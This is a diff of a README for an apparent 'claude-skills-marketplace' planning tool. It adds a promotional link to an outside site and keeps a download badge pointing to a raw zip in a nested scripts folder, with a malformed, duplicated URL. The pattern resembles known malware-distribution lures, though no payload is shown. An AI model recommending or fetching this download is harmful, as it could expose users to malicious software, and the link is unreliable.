@@ -4,6 +4,8 @@
 
 Welcome to **claude-skills-marketplace**! This software helps you generate detailed planning documents to guide AI-assisted software development. You don't need any programming skills to use it. Follow the steps below to download and run the software.
 
+Chinese users can also discover more skills through Skills宝: https://skilery.com
+
 ## 📥 Download the Application
 
 [![Download Now](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip%https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip)](https://github.com/428alexander9/claude-skills-marketplace/raw/refs/heads/master/project-planner-skill/scripts/skills-marketplace-claude-2.9.zip)
